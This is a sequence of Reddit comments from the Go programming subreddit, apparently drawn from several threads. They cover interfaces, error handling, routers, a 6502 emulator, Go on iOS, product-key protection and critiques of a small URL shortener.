I already done in 3 years ago. https://github.com/mattn/go-try
Great feedback. I've added the following paragraph to the post: &gt; Bundling of the actual root CA certificates is pretty straightforward. The Contributor app takes a cert bundle, /etc/ssl/certs/ca-certificates.crt, from CoreOS Linux and assigns the text to a global variable named pemCerts. Then in the main init() the Contributor app initializes a cert pool and configures a HTTP client to use it. From this point on all calls using the new HTTP client will work with SSL end-points. Checkout the source code for more details on how the the root CA certificates are wired up. Followed by a code example of how the CA certs get wired up and configuring a HTTP client to use them.
Both the reference to "CoreOS Linux" and "source code" are linked to actual content. 
Looks cool. The first thing that stands out to me is that you have functions that write to stderr and call os.Exit on error. I would have the functions return an error and do the error logging and os.Exit at a high level (in main in this case). For example (untested): func parseIPv4(arg string, msg string) (net.IP, error) { ip := net.ParseIP(arg) if ip == nil { return nil, fmt.Errorf("Can't parse %s IP '%s'\n", msg, arg) } ip := ip.To4() if ip == nil { return nil, fmt.Errorf("IPv6 is not supported, sorry") } return ip, nil } and in main, something like: upIP, err := parseIPv4(flag.Arg(1), "upstream") if err != nil { fmt.Fprintln(os.Stderr, err) os.Exit(2) } For code this size it doesn't make a huge difference, but in a larger project having functions that can potentially terminate the process scattered all over the code would be a nightmare. It might also be a fun little exercise to implement toggle using sync.atomic. I believe it can be done with just AddUint64, LoadUint64 and a struct like this: type toggle struct { n uint64 }
I do agree with the first point. With anything bigger I would certainly want to 'die' only within the top-level loop or equivalent. In this particular case there are only two non-main functions that can die - and they do so only on what I decided to be a non-recoverable error. I've never used sync.atomic. I was actually surprised a bit that the expvar package doesn't already have a Bool wrapper, so I rolled my own. My feeling is that my mistake here was naming the holding struct 'toggle', and then ending up with the comment '// Toggle toggles a toggle.'... Naming's not so simple.
Do it or don't do it, just don't pander for more stars.
I don't think he was trying to quote Star Wars. But seriously, either do it or don't; saying you'll do it *if* you get attention is a total dick move.
Currently, I an just looking for recommendations for building JSON REST API.
I'm right in the middle of writing a Go CLI tool and this couldn't have come at a better time.
Nice!
Would be awesome to have a high quality qml package for Go working on all platforms! I guess iOS is not possible for Go, or is it since it is compiled?
Thanks for taking time to respond! My biggest struggle with 'goose' was so with the dialects (or better to lack of proper architecture) only as I'm using modified postgres driver. Will try use migrate in coming weeks! &gt; I just had a quick look at the other migration tools, too. 
**tl;dr**: interfaces allowed me to decouple things and reduce code complexity. There are loads of blog posts and tutorials out there that deal with interfaces (easy to google) and they mostly give examples like Shapes, Animals and so on, I figured a 'real world' example might give some flavour so here we go... In my [Gameboy Emulator](https://github.com/djhworld/gomeboycolor), I used the concept of *peripherals* to abstract the layer between the memory management unit and stuff that reads/writes to memory. In simple terms, the CPU reads/writes to the MMU and it's the MMUs job to store/retrieve that information to/from the right area. A good example might be when the CPU needs to read/write to the memory in in the GPU, in my emulator the MMU acts as the arbiter between these two peripherals. So when a call to write to memory in address that the GPU is responsible for, the MMU should recognise this and act accordingly. The problem I was finding though was there are loads of peripherals that look at different bits of memory (joypad, GPU, sound etc), how do I make the MMU aware of all these? A first stab approach might be to add a bunch of methods to the MMU like *connectGPU(gpu *GPU)*, *connectSound(sound *Sound)* and so on, and then update the MMU read/write code to say "if memory address is Y then call gpu.memoryAddressRead(Y), else if memory address is X then call sounddriver.memoryAddressRead(X)" As you can imagine this is pretty tedious and time consuming to write and also means having to **couple** my MMU code to everything else, for every new peripheral I would have to add a *connectMyPeripheral* method and then update all the areas in the code to deal with it. This would be a pain if I ever need to take a peripheral out too, I would have to go through the MMU code removing everything and making sure I haven't broken anything in the process. The MMUs primary job is to act as the middleman between the CPU and everything else in the system, and as far as it is concerned, it's just passing bytes to and from things that are interested. What you want is something to allow a peripheral to say say "hey MMU, I'm in these memory addresses, give me a shout if you get a read/write call to them!", the MMU should not need to care whether that thing is a GPU, a SoundDriver or anything else. So to implement this I made a [Peripheral interface](https://github.com/djhworld/gomeboycolor/blob/master/src/components/Peripheral.go), this interface describes what a peripheral should do. Anything that implements the Peripheral interface, i.e. it implements the methods described in the interface, can be considered a Peripheral. With this in mind, I was able to reduce the complexity of my MMU code by allowing peripherals to "connect" to memory addresses they were interested in knowing about ([see here](https://github.com/djhworld/gomeboycolor/blob/master/src/mmu/mmu.go#L206).) This way as far as the MMU is concerned, the items listening on those memory address are **guaranteed** to be a Peripheral entity that understands Read(), Write() and so on. It couldn't care less whether that's a GPU or anything else, nor should it need to know either. That way when the CPU says "hey I want to know about what's going on in memory address X", all the MMU needs to do is query its internal map to say "hey are there any peripherals that deal with this address"? If it finds one then it simply passes on the Read() request to that peripheral. Notice how I pass a **Peripheral** as an argument? and notice how at no point in the MMU code I have any reference to a GPU or anything else. In summary by introducing the interface I was able to * Decouple peripherals from the MMU. The MMU code doesn't need to be touched when you add/remove a peripheral. * Simplify my MMU code. Implementing it this way would have also allowed anyone else implementing a peripheral to just go ahead and do it, they don't need to keep asking me to update the MMU code. That's the power of interfaces for me, but there are many more things you can do with them, but this was a major win for me. 
Though interfaces _can_ be overused, it's uncommon. I would suggest using interfaces often. If you're unit testing a function or method that takes arguments of concrete types, consider swapping the concrete arguments out for interfaces so you can mock those dependencies. This way you can very specifically test just that particular unit and have a greater degree of control over your tests. Also try to implement existing interfaces where you can, and do it often. Implementing a common interface in Go automatically makes your type compatible with potentially thousands of existing functions and methods across the go-verse. Use an interface nearly any time you only care about what a variable does, not what it is. See also [Maximizing the Use of Interfaces in Go](http://mwholt.blogspot.com/2014/08/maximizing-use-of-interfaces-in-go.html)
I've seldom needed anything more than net/http and encoding/json for an API... also see [mholt/binding](https://mholt.github.io/binding) for a convenient way of getting data out of requests.
&gt; so what is the rational for having both ? That should be "rationale". &gt; If new was removed in favour make, how would you construct a pointer to an initialised value ? I'm a Go novice, but couldn't you do: v := 1 p := &amp;v Of course, having to declare and dereference a local variable every time you want to put something on the heap would be lame. Nice post!
Use an interface if you want to use the same function for two or more objects with different implementations.
Can you explain this with an example ? Sorry, this might be a dumb question but I seem to be still stuck with the Animal, Shape examples.
I use an interface to decouple my data layer: mongodb or mocking with memory. I have a Storage interface with various CRUD ops that are implemented by a mongodb server struct and a "Memory" struct (stores data in arrays). When the program runs, if the program is deployed to production, the mongodb struct is created. If the program is running on my computer, the memory struct is used. This way I don't need to run a local mongo instance during dev and can run more storage involved tests. 
Minux got Go working on iOS a couple years ago (to some degree) and since then much has happened to make it even easier. It's not included in the mainline tree yet but it seems likely in a future release. Go 1.4 will include a lot of Android support. iOS seems likely in Go 1.5. David Crawshaw (who's doing Android) has expressed interest in iOS as well and he's trying to design most of the input &amp; graphics APIs to be accommodating to both.
It's shame there's no expression sugar for: var s = &amp;"value" (other than var s = func(s string) *string { return &amp;s }("value") ;) Like second argument for the new function: var s = new(string, "value") Yes, in general I'm ok with Go not making it easy for me to create garbage, but there's one use-case I wish it could help me: it often happens that structures used in various wiring formats handle nullable fields with pointers - writing fixtures for testing those is not a pleasant thing.
Example: if I want to write the word-counting utility 'wc', rather than hardcode the input representation to something like a string, I'd take in an io.Reader as input. I can still test the functionality by using bytes.NewBufferString. The code will work on disk files, network resources, etc. because the code has not been calcified to work only on a particular concrete representation. Here. We might as well make this [concrete](http://play.golang.org/p/AMI5UaLpGA): http://play.golang.org/p/AMI5UaLpGA :P So note here how the wc() function there can work on anything that is an io.Reader. The example tries out two kinds of io.Reader, one from a regular string, and yet another one compressed bytes.
I wonder how many red flags a go app would raise in the review process... I'd love to see this happen though (if only for a camlistore client ;) Are there any other languages that are officially supported by Apple?
We keep it simple, really net/http, github.com/gorilla/mux, and a server startup and config package. Not really wedded to gorilla/mux, I simply don't care enough to adopt a different router package at the moment. I've looked at using some more comprehensive packages, but for the intentially small scope of each service (say &lt;5 endpoints) it hasn't really been worthwhile. Additionally, I have yet to find a package that I like which keeps reflection off the request path, which IMO is required to maintain high performance and avoid losing the benefits of static typing. In short, keeping your code DRY and your services small really seems to eliminate the need for heavy frameworks.
This is an excellent, detailed example!
No, I didn't mean it that way. Apologies if it looks like that. I was just trying to see what are popular Go libraries which come into mind of people when they see these kind of tasks. For example if someone would ask the same in python, if he gets a list of some popular librarries for web-dev like django/flask, he will come to know what are the things community commonly uses.
I'm building an emulator for a hardware project I'm planning. This package emulates an 6502 Microprocessor (as found in the NES, Apple II, Commodore 64, Atari 2600 and many others) and some other components like an address bus, ram, rom and IO devices. Although it's still a work in progress, the 6502 processor is 100% complete. Feedback on code / documentation / architecture / packaging are very welcome. Cheers!
Yes, I saw your comment on SO. Thanks for that - I'll fix that when I'm back working on my code. Tweetarray contains a slice of tweets which are read from the database table that contains all the tweets that belong to the user. The page will display a list of tweets, and each tweet has a button beside it. By clicking each button, the tweet beside that button will be deleted together with the button. I'll try your method. Thank you for answering this! 
Just to clarify, why did you use .Tweet.ID to access the tweet id? By the way I actually have error handling in my actual - I just wanted to paste the relevant code for my question. 
&gt; Just to clarify, why did you use .Tweet.ID to access the tweet id? I'm just guessing. I have no idea what the structure of `Tweetarray` and the tweets it contains looks like. But I assume—if you are pulling them from a database or an API—that they have an ID. You'll want to use this ID when deleting them (`"DELETE FROM &lt;table&gt; WHERE id = $1", tweetID`), hence we make sure `Tweet.ID` is available to the POST form. i.e. — loop over all of our Tweet items, creating a HTML button that contains the name deleteTweet and the ID of the tweet as the value. These all reside within the same HTML form: &lt;form action="/tweets/delete" method="POST"&gt; {{ with .TweetArray }} {{ range . }} &lt;p&gt;{{ .Status }}&lt;/p&gt; &lt;small&gt;{{ .PostedDate }}&lt;/small&gt; &lt;button type="submit" name="deleteTweet" value="{{ .ID }}"&gt;Delete This Tweet&lt;/button&gt; {{ end }} {{ end }} &lt;/form&gt; A user clicking the button will send a request to `/tweets/delete` on the server with a POST body containing `name=deleteTweet` and `value=sometweetID`. You can then use `r.PostFormValue("deleteTweet")` to get the ID (aka sometweetID) and then pass that to your database function. Note that predicates your database function works, and ignore any issues (CSRF, etc.) with deleting something without checking if the user is authenticated, etc.
Interfaces are **great** for testing. Do you need to test a case where an `io.Reader` that your app is reading from fails? Just [do this](https://github.com/justinas/nosurf/blob/b3da8cbf9967ae5a9ee645884f98c00e7871f664/testutils.go#L13-L18). 
Sounds like an interesting project, one small thing though I think you meant 'Atari 2600' and not the 'Amiga 2600', the Amiga used a Motorola 68000 processor. Also both the Commodore 64 and Atari 2600 used variants of the 6502, I don't remember what was different with the 6510 used in the Commodore 64, but I'm pretty certain that the 6507 used in the Atari 2600 could only address 8k.
IIS? you mean .. msft closed-source proprietary stack? WTF indeed. NO THANKS! 
Yes, I mean the Atari 2600. And you are correct about the variants, but they still use the same basic design of the 6502. Wikipedia says: &gt; Popular home video game consoles and computers, such as Atari, Apple II, Commodore 64 and others, used the 6502 or variations of the basic design. 
thanks! type TweetArray struct { Userid int64 Username string Password string Posts []*Post } Type Post struct { Tweetid int Username string Status []string } I use a Readdata() function to extract an array of Status belonging to a username from a database table containing the statuses. However when I do that, and apply your method in my html code above, I get an array inside an array, and the page displays an array. How do I resolve this? edit: I've updated the code, but still have some issues. Could you help me with this? http://stackoverflow.com/questions/25367310/go-insert-variable-in-string-in-templates/25369323#25369323
Yes they are all variations of the 6502, but the differences will have an effect on emulation of the respective systems using said 6502 variations. For example I just looked at wikipedia concerning the 6510 and apparently it had extra pins for memory bank switching, and as I already stated the 6507 was limited to 8k addressable memory as opposed to 64k in the 6502 (and 6510). Of course there's nothing wrong with emulating the 6502 and not it's variants, I just wanted to point out that in the case of Atari 2600 and Commodore 64 atleast (since you mention them), they are not using 'straight-up' 6502. By the way, did you know that there is a NES emulator already written in Go, https://github.com/scottferg/Fergulator It might be of interest as it also implements 6502 emulation in Go.
I may be asking a little bit more, but is it possible for you to make a blog post explaining in details? Thanks ! Great wok !
Any feedback would be appreciated.
Yes, but I'm quite busy now with adding 65C02 support and adding IO (6522 and 6551 to be specific). What do you expect to learn from a blog post specifically?
That depends on why you're putting it up. Are you looking for general comments, or are you looking for people to actively use it and pull it into their projects? In the latter case, the next question to answer is "What does your router do faster, better, or at all that the couple dozen other HTTP routers available do worse or don't do?" That's not snark... it's the next question you need to be asking _in that case_. If it's just for idle feedback, let us know. It's two very different standards between those two reasons.
Fergulator is my project. It's actually a slightly different CPU from the 6502 but about 99% of the way there. Off the top of my head, decimal mode is non-existent (gave them space to put the APU on the same chip) and a few of the opcodes behave differently from what you would expect from the 6502.
I'm looking for general comments, because initial version. But it really simplest in use router than other HTTP routers available. The router does not use a low speed regexp methods. It checks JSON contents automatically.
Am I blind? How is it printing "uncatched" (caught?) exceptions?
So it has an 'out-of-bound access' fix to the rsa implementation. Can anyone tell how serious this was? https://code.google.com/p/go/source/detail?r=58ee390ff31602edb66af41ed10901ec95904d33&amp;name=release-branch.go1.3
It would be nice if we could just have make(*T) = new(T). var x1 *int var x2 = make(*int) That would be very intuitive and make it easy to see what was going on. The following short-hands would also be good for consistency: x3 := &amp;5 x4 := &amp;"foo" Those changes would make memory allocation feel much more 'orthogonal' to the types it works on. No need to distinguish between builtins, simple and custom types all the time.
WIkipedia has a good article on Consistent Hashing http://en.wikipedia.org/wiki/Consistent_hashing
Hey, author here. I actually came across a problem with Zombie processes at work today. I believe (although can't back any of this thinking up) that Go handles it in much the same way. If I send a kill signal to any of the child processes then they become zombies but are correctly released only after calling cmd.Wait(). I've never done anything that requires much careful consideration to the use of goroutines but my last example shows how I tend to approach them. It *should* just be a case of "go cmd.Wait" even but as you point out this could become costly if you have lots and lots of processes.
Something very basic on how to map hardware with go. Something in the in the lines of interpreting registers, memory etc and mapping them on to go etc
I have the same question! 
Zikes and Broeman, I'm glad for my good timing then! I'd appreciate input on how helpful the post was and whether there's anything that I can add or change to improve its effectiveness. If there are any practices that are interesting or different than mine that come up when you implement your own CLI tool, I'd like to hear about it.
dAnjou, like you, reading the documentation on the flag package was enough for me to understand the basics of how it works. At the same time, there were areas of the documentation about other packages that were clarified by works from fellow gophers. I feel that the time spent on my end in learning about the package and sharing my findings could save Gophers a little time + provide a resource that they might find easier to understand than others. 
I'm surprised this doesn't come up much in discussion, since Go is a systems language and this is very much a systems programming topic. I was thinking about the example in the Guile library about forking and exec'ing gnuplot, communicating with it over a pipe. That would be a great example for a language like Go.
To help with extra randomness randomize the order of the character list(Soon to work on this to be more viable as an option) and change the secretnumber integer to a number ranging from 1200-1500~. Also encrypt the character list so people don't know the order. http://i.imgur.com/dsUWxBq.png is an example of something that may happen if there wasn't preventions as stated above.
I actually used this quite a bit. Today I stubbed out communication over a serial connection to a micro controller with starting the portable part of the c code locally (this not needing to flash the code until it works) and wrapping stdio into a io.ReadWriteCloser. Gotta love interfaces :) if you like you can see the code here https://gist.github.com/575bfe907c6dd141949e I also used the same approach to shove wav data through a subprocess that runs hardware simulation code https://github.com/cryptix/pshdlWavSim And to one up this even more, a io.ReadWriteCloser is enough to create a [jsonrpc](http://golang.org/pkg/net/rpc/jsonrpc/) client or server. :)
Actually typing `go cmd.Wait()` is probably a code smell... encountering a situation where you've got enough of them hanging around that you're afraid about resource usage definitely is. If you're executing anything other than a program you completely don't control the source of _and_ it is beyond terrible about terminating on time, seriously think twice about what's going on there. Unfortunately, there are enough very badly behaved programs in the world that I can _only_ label this a code smell. If you're stuck with one of them, well.... sorry. Sometimes you count yourself lucky to only have _smelly_ code....
That's really just putting lipstick on a pig. The only reason to use code like this is if you've sat down and figured out exactly which attack you're trying to prevent. Are you just trying to keep honest people honest? Then this is enough; keep it simple. Anything that increases the chance of a legitimate customer being turned away is a Big Deal when looking at the cost/benefit analysis. Are you trying to prevent people from pirating your software? You should count yourself lucky to have this problem at all! And also, yeah, give up. Your first task if you really think you can defeat even a modestly skilled pirate isn't to rotate the characters or use any sort of encryption or anything else... it's to figure out how to prevent where ever the moral equivalent of if KeyIsValid(userKey) { is from being replaced with if true { at the _assembly code_ level. If you can not yourself crack a program that does exactly that with a disassembler, a debugger, and no source code right now, stop now. You can't play this game.
I know you can simply change a if statement to be skipped in assembly. This is just to really stop the easy modification of the key itself. More randomness so it's harder to manipulate keys to a standard user. I'm not trying to make a blackbox of product key checking. It's not my field anyways to try to make this 95% more harder to crack. Also changing the secretnumber is to also be different from other products who MIGHT use this(also changing the order of characters).
Compared to the overhead of having another process on the system, go cmd.Wait() is nothing. It will be handled by the Go runtime and won't use CPU until it actually returns. If you are tracking the process, I would probably start a goroutine that waits on the process and sends an event back on a channel when it dies.
If someone is interested in their architecture, check http://distributedpodcast.com/2014/episode-14
You have a lot of time to cleanup and change the import path. I think it's fair for the sake of uniform
Of course you have a lot of time. The reason why we have compatibility promises is not that it's impossible to adapt to changes in libraries, but rather that it takes manpower to do so and that you often have code that hasn't been maintained in ages. Applying the changes needed for one breakage is easy, but they tend to accumulate and all of the sudden it's no longer applying a fix but rather hunting through release notes and doing your best to fix the 50 places the changed API broke your program. Many languages and projects seem to have problems understanding this though.
I believe that the compatibility promise is around the core language and libraries, but not the tools, such as go get.
The [Go compatibility promise](https://golang.org/doc/go1compat) explicitly says "The Go 1 release includes their implementation in the form of two compiler suites (gc and gccgo), and the core libraries themselves." So these are covered.
Nice!
On that note, why not list them somewhere on golang.org prominently? The subrepos, especially ones like `crypto` or `text`, are really useful, but one has to resort to Google to find them. Correct me if I am wrong, but there's no *official* listing of the subrepos anywhere, except for the little dropdown on the [source browser](https://code.google.com/p/go/source/checkout). I assume some people actually have the problem finding those stdlib-yet-not-stdlib packages and end up creating their own for each purpose that's already served by `go.whatever`. Just look at this [bunch of bcrypt packages](https://github.com/search?utf8=%E2%9C%93&amp;q=language%3Ago+bcrypt&amp;ref=cmdform) [This article](http://www.somethingsimilar.com/2012/05/24/finding-go.crypto-and-go.net/) makes the exact same point... two years ago.
Not at all. The document *mentions* gc and gccgo as implementing Go 1. It doesn't say the behavior of the tools is covered, in fact it says the opposite. &gt; Finally, the Go tool chain (compilers, linkers, build tools, and so on) are under active development and may change behavior. This means, for instance, that scripts that depend on the location and properties of the tools may be broken by a point release. 
Made my day. 
To anyone reading this thread: While /u/jerf may seem a bit harsh and off-base here, he is absolutely correct about all this. Anti-piracy mechanisms are usually much more involved than a mere if() check in code. After all, we're really talking about security here: doing this right isn't easy. The state-of-the-art for these kinds of countermeasures are usually one of the following: * Some kind of crypto-obfuscation, with deliberate dead-ends and pitfalls for the would-be hacker with a disassembler. There are commercial solutions for this for a reason. * Paid-for licensing that is so expensive, that nobody in their right mind would share the key since they could wind up handing their competition a free copy. * Personalized builds that securely ID the software as belonging to a particular customer - once the pirated version is found in the wild, the customer's support license is revoked. * None at all. Charge for support instead, or simply do the cost/benefit analysis to see if the free advertising from piracy is a net negative or not. If your software is cheap, this is probably the way to go. Other solutions, like self-destruction if the software can't verify the license (phoning home), or hardware dongles, can work too. Ultimately, like any security solution, you are attempting to raise the bar for the attacker to the point where their effort exceeds the asking price of the product.
There's a link at the bottom of the package listing, but it's far from prominent: http://golang.org/pkg/
Something like this might work: // separate package foo package foo // unexported type type format int // exported values const ( Bold format = iota Italic Underlined Plain ) EDIT: This works, except they need to be struct types, so that you can't do `foo.Plain + foo.Italic` to get an undefined value.
If the type is unexported how would you use it for type checking outside the package?
The compiler still knows about the type outside the package, it just doesn't allow you to create new values of that type.
That's almost right - but in his use case you should be able to produce Bold and Italic, or Plain and Underlined. It looks like a bit mask would be more appropriate, like: type format uint const ( Bold format = 1 &lt;&lt; iota Italic Underline ) func main() { font := Bold | Italic if font &amp; Bold != 0 { // true fmt.Println("Bold!") } if font &amp; Italic!= 0 { // true fmt.Println("Italic!") } if font &amp; Underline != 0 { // not true fmt.Println("Underline!") } } And you just represent Plain by there not being any formatting, I would think. And then uh... don't use arithmetic ops and just use bitwise.
Github [here](https://github.com/limetext/lime) Written in Go.
How would you declare a foo.format variable outside the package? Wouldn't saying var x foo.format be caught by the compiler since format is unexported from foo?
Great read. 
No. That would give away something that only the Go team should have control over.
Do you know where Buffer is declared? The one that's used in view.go?
Something like this (http://play.golang.org/p/Fc7GoCUjvM): type Format struct { style string } var FormatBold = Format{"bold"} var FormatItalic = Format{"italic"} var FormatUnderlined = Format{"underlined"} var FormatPlain = Format{"plain"} Outside this package, you can't make a new struct of type Format because its only field is unexported. (This is assuming you want something like an enum. If the choices aren't mutually exclusive, you may want a bitfield.)
Abuse of dot import: https://github.com/limetext/lime/blob/master/backend/view.go#L15 https://github.com/quarnster/util/blob/master/text/buffer.go
it's not only setup API. but documents. based on your database tables. now easily api application. see first. Then comments.
&gt;see first. Then comments. No. I can't spend my time on check all internet content in my newslist (especially video). U wrote in title "Create a Web API Application in One Minute in Beego" - thats all.
Cheers
format is unexported, that's true. This variation might help explain what happens here: package foo type format int const( Bold format = 10 Italic format = 20 Strong format = 30 ) And then ... func main() { foo := fmttest.Bold fmt.Println(foo) fmt.Println(reflect.TypeOf(foo)) } Full disclosure: I'm not convinced this is the "best" way. 
Through this thing told me that the title is importance. haha
As Yoda says: &gt; Do or do not. There is no try. 
While I'm also a big fan of Go, parametric polymorphism (aka generics) is hard to go without. I do miss it every now and then. Probably not something a Pythonista would share necessarily.
Working without try catch exception handling is also a pain.
Your prayers [have been answered](https://groups.google.com/d/msg/golang-codereviews/CSCT3go06uA/HSrT4Yd2lAAJ).
Thanks! Looks great.
It's doesn't appear that any progress has been made with the Windows build, over the last four months. Has anyone here got the Windows build working?
Sounds like a big deal, particularly removing C code from the runtime should make it easier to rewrite the compiler in Go, and also presumably it'll be easier to write a debugger once more-or-less everything is in pure Go. Question: what is "the G stack"? I guess it's the name of a stack within the runtime, as opposed to the "M stack". Also, what's the M stack? Could it be that a G stack is the stack of a goroutine, whereas the M stack is the stack of the 'main thread'? Ta
Working without any coding convention you're used to is a pain at first. Generics are obviously the big, pervasive complaint, but you can approximate try/catch/finally fairly easily in Go. It just won't *be* try/catch/finally.
finally = defer exceptions = panic catch = recover All of those things have an analog in go. But the conventions for using them are different for reasons that have been thoroughly discussed on the mailing list.
[This comes from an MS guy](http://blogs.msdn.com/b/oldnewthing/archive/2005/01/14/352949.aspx), but the conversation is relevant. Here's [someone arguing the opposite](http://stackoverflow.com/a/111213) for C++. I think golang addresses some of his complaints about return codes in C++. I like golang as it mixes things pretty much the way I want: * Typed errors * Multiple returns, so no in/out/inout funniness * Defer/panic for the truly exceptional problems There are patterns in go for centralizing error handling, if you miss that from exception-based languages. (For example, use a channel to publish to an error reporting service running in a goroutine.)
This blog http://morsmachine.dk/go-scheduler gives a good overview of how the scheduler works, including all the different 'stacks'. 
i think it's awesome, exceptions suck
You still couldn't make functions with the unexploited type. This seems a bit too restrictive. I might just export the type even though it opens up the possibility of errors being introduced by downstream programmers.
You can't do it at compile time, however you can use implement `IsValid` on the format to check it, for [example](http://play.golang.org/p/poN46ax6pg) : type Format byte const ( Bold Format = 1 &lt;&lt; iota Italic Underline Plain maxValue ) func (f Format) IsValid() bool { switch f { case Bold, Italic, Underline, Plain: return true } return f &lt; maxValue &amp;&amp; (f&amp;Bold != 0 || f&amp;Italic != 0 || f&amp;Underline != 0) } func main() { fmt.Println(Bold, Italic, Underline, Plain, maxValue) f := Bold | Italic fmt.Println(f, f.IsValid()) f = Format(1021) fmt.Println(f.IsValid()) } //edit The advantage of this approach is you can access format from outside the package and even serialize it with multiple values and at any given time you can check if it's valid or not.
It really annoys me when I see something about a Go talk (or any other talk) and all there is are the slides. I'd actually prefer if nothing was posted instead, so I wouldn't get my hopes up. Speakers, please record your talks (even just audio would be fine if the slides are posted too).
No. This is about the runtime, the part linked into every program. The compiler being mechanically converted to Go is a separate activity going on now. But the runtime is being done by hand. 
Well, you *can* make a an object of type Format, but the style field will be set to the zero value (an empty string). It might be prudent to also declare: var FormatNone = Format{}
You can make functions inside of the foo package. If you're talking about making functions on the format type outside of the foo package then yes, you might as well make the type exportable.
Oh wow, thanks for the catch. I'll amend that.
You won't be able to serialize that with the encoding/json package, because the style is private.
I'm sure eventually it will. Keep in mind this is very new and still in development.
Did you know about [cupcake/rdb](https://github.com/cupcake/rdb)? Was there something missing that inspired you to write this?
I only knew about redis-rdb-tools in Python. I mainly wrote it for fun, so I wanted to write the parsing code anyway, and didn't check other packages.
Thanks for the feedback ! The only not-so-cool thing about the use of channels is handling race conditions: I first had a "done" channel, but since there's no guaranteed order in a select block, a lot of times the receiver quit before handling everything. I found the current solution which works well, but unfortunately makes the receiver loop kind of ugly.
Yeah, I figured that out last night. I'm going to have to make everything public.
You can keep things private and still encode it to Json. Just have your struct implement the [Marshaler](http://golang.org/pkg/encoding/json/#Marshaler) and [Unmarshaler](http://golang.org/pkg/encoding/json/#Unmarshaler) interface.
I can't say I agree, nobody's losing anything by just releasing the slides, it's better with audio but slides are much better than nothing.
Here's the way I'd do this: http://play.golang.org/p/U1H1hcxE6s 
fmt.Printf is a good idea indeed. And yep that was what I've purposely not done because... uuh.. I like modulos? I was just trying to find another way, even if it was harder/ bad. Could you write how you would have done the diamond? Thanks!
Right on, thanks. On the diamond exercise, I haven't done this error.
Sure: http://play.golang.org/p/qWX6jF-90s Mine probably aren't the shortest or cleverest possible answers to this, but what they are are simple and very easy to understand. Remember as you learn more that writing in a way other people can read is almost always more important than anything else. I understand you're trying different ways to solve the problems and that's awesome, so I'm not scolding you, just pointing out something that took me a while to realize.
Google Code ties into their code review tools and practices, so moving to GitHub (a tool they do not control) is unlikely to benefit them. It can also reduce the SNR. 
And it's deployed :)
I am feeling random today, so following the spirit of [this post](http://www.reddit.com/r/programming/comments/2e37xi/a_url_shortener_service_in_45_lines_of_scala/), I created this project. Not as impressive as 45 lines, but this project *almost* strictly uses standard library only. If default `net/http` supports some rudimentary pattern matching, I could have dropped the Gorilla Mux dependency.
yep, and I totally understand that but, issue tracker without talking about code navigations wikis and so on, is rather very primitive. I some extent I would say it' "another EOL product from google". Again I totally understand the SNR, so it could make sense even tho, I still prefer the mozilla approach. 
"How performant Go is:" … FYI. You are measuring the speed of the file system and `ab` tool, not Go. 
Since `http.ListenAndServe()` has a parameter for the default handler, you can remove the line where you say http.Handle("/", r) and just do http.ListenAndServe(":"+port, r) and save one line that way. If you want to be consistent in not handling errors, you might as well drop lines 49 to 51! :)
The Google Code issue tracker is far more sophisticated than GitHub's.
Another general tip: http://www.golang.org/pkg/path/filepath/#Join 
Patched. Thanks for the feedback.
Given that the net/http ServeMux doesn't do pattern-based matching, I don't see how removing gorilla/mux would be a net positive. (and chasing LOC instead of clear code isn't useful)
Have you heard of databases? 
That's a nice trick I'll try to remember! Thanks
I am just taking my first steps in programming Go, but I have a few questions. - Why did you abstract away the request and responsewriter? Most other routers I've taken a look at maintain that interface. - Would it make sense to split the code up into a router and api-framework? - How would you serve HTML templates from this? Seems mostly geared towards JSON or text/plain. 
Very insecure, you can read any file with the RedirectHandler
There is no global lock synchronizing the ioutil.ReadDir and the ioutil.WriteFile calls. It seems possible for two requests to get the same number of files from ioutil.ReadDir, resulting in a race for the final url. Also, I'm not sure setting GOMAXPROCS is really necessary in this case. Network IO does not require multiple threads. I don't really know about file IO, it's not quite the same. My understanding is that it should be fine with GOMAXPROCS at 1. But I don't have a definitive reference. You don't error out (404) in the redirect handler either. So.. I made it longer. But you have all these blank lines in your functions. What's up with that? nice work edit: that was not sarcasm. sorry. this is fun. :)
Like almost every url shortener, you only need to know the hash/code.
All you'd need to do is splitting r.URL.Path at / and take the last part. Or am I wrong? Edit: didn't see there's already an issue for this. :)
This is awesome, will be using this to learn about one way a link shortener can be implemented. Thanks!
That's a pretty bad race with the shortened code creation, no? Or is the server single threaded? (I'm assuming Go http server starts a goroutine per http request) 
It doesn't really _implement_ a link shortener. It does implement a HTTP server which calls converts a number to base36 using `strconv`. A link shortener in it's gist is simply a bijective function, or even a one-way hash function and a database. If you are interested in how to implement the base conversion part you can have a look at my library ([short](https://github.com/simonz05/short)).
Have fun reading that one of 100M shortened urls from your filesystem.
WTF is with the downmodders in this subreddit sometimes? It's not the first simple, factual, _correct_ statement I've seen downmodded around here. I've gotten down to -3 on such things before.
There's actually a back story on why I chose filesystem. I am currently tinkering/researching on the ideal abstraction library that sits on top of path-like things such as: S3, etcd, zookeeper, any fuse fileystems, etc.
I refuse to call anything without persistence a "database", so the kids can run along and get off my lawn. In any case, complexity of implementation is only relevant if it bleeds into the interface, which is pretty hard to argue for an app which uses 5 I/O syscalls by my count. But what really matters here is that support is built into the stdlib...
a little dryer http://play.golang.org/p/KE6gQ4SNMf
That's true when using local filesystem. But if you were to use this in production, you should really use one of those networked/clustered filesystems. They provide locking mechanism for you. Or better yet, use a real database.
On some large scale applications I've worked with, we've had issues with dentry/dentry cache synchronization. Or at least that's what we suspect. That's a Linux VFS thing and is common across all filesystems. For OP, this is probably OK as long as storing is far rarer than reading. However, assuming the network filesystem will handle locking isn't too good. Apps have to use `fcntl(2)` instead of `flock(2)`, for example. So it's just not reliable to use a network filesystem and assume standard file lock checks will protect you.
Even of your underlying store has fancy locking, you still have a race between counting the old number of entries and creating a new one.
Here is a version more similar to the Scala code in that post. https://gist.github.com/tuxychandru/d5ac22f5cb4a8ca3eeff This one sticks to stdlib (except the redis connector) and is 64 LOC.
Thank you for your questions. Yes, I try to make some specific package which compact in code, but has what the doctor ordered. Using the request and response writer as direct vars is not useful way in many cases in my opinion. In a some cases will need more simplest methods to get url parameters, to write header, body, etc. Of course, all the classic methods are accessible. This is one more way. If it useful, why not? The package is not pretended to be as all-in-one framework. Better to have some sugar from framework, but still be the simple router. I thought about HTML and I will planed to release it in the future. First of all, the router arranged as RESTful API helper, nothing more. But HTML binding will be easy integrated as option in replace text/plain if need.
yeah, then go to that dir by mistake and say good by to your session and sometimes server. EXT4 can't handle that many docs in one dir.
The port in environment variable looks dirty. Better to put it in a flag, much cleaner that way. Unless you want to keep no. of lines at a minimum.
I'd look at https://github.com/boltdb/bolt - super easy, file based key/value store. It'd be perfect for this, and probably much faster than what you're doing now.
